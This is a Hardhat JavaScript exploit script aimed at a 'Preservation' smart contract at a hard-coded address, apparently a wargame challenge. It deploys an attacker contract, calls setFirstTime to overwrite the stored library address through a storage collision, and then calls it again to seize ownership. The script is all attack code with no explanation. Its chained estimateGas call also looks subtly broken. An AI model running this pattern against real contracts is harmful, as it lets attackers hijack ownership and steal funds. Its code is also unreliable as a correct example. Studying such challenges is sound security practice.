const hre = require("hardhat");
const { ethers } = hre;
const { BigNumber } = require("ethers");

async function main() {
  const Preservation = await ethers.getContractFactory("Preservation");
  const Attacker = await ethers.getContractFactory("Attacker");
  const preservation = await Preservation.attach("0xe55D13BCDaAef99F4e1a6e5a59e4DEDc261a9015");

  const attacker = await Attacker.deploy();

  console.log("Attacker address:", attacker.address);
  console.log("Preservation owner:", await preservation.owner());
  console.log("Preservation before call - Lib 1 address:", await preservation.timeZone1Library());

  console.log(await preservation.setFirstTime(BigNumber.from(attacker.address)).estimateGas());
  console.log(
    "Preservation after call - Lib 1 address:",
    await preservation.timeZone1Library(),
    "is attacker address:",
    (await preservation.timeZone1Library()) === attacker.address
  );

  // steal ownership
  console.log("Steling ownership...");
  await preservation.setFirstTime(123);
  console.log("Preservation owner:", await preservation.owner());
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
